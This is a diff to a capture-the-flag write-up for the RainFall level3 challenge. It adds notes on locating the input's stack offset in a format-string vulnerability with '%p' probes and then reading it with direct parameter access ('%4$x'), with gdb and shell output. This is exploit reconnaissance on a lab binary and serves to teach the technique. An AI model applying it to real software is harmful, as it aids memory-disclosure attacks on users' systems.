@@ -49,6 +49,8 @@ https://cs155.stanford.edu/papers/formatstring-1.2.pdf
 ```
 (gdb) run <<< "AAAA %p %p %p %p %p"
 
+finding the offset of our input string in the stack
+ 
 esp after fgets
 
 (gdb) f
@@ -59,3 +61,18 @@ level3@RainFall:~$ ./level3
 AAAA %p %p %p %p %p
 AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520
 ```
+
+41414141(the 4th hex value), 41 represent A so 4 is the offset of our input string in the stack.
+
+from the stanford article:
+
+a way to directly address a stack parameter from within the format string, The direct parameter access is controlled by the ‘$’ qualifier.
+
+so in our case
+```
+level3@RainFall:~$ ./level3
+AAAA %p %4$x
+AAAA 0x200 41414141
+```
+
+
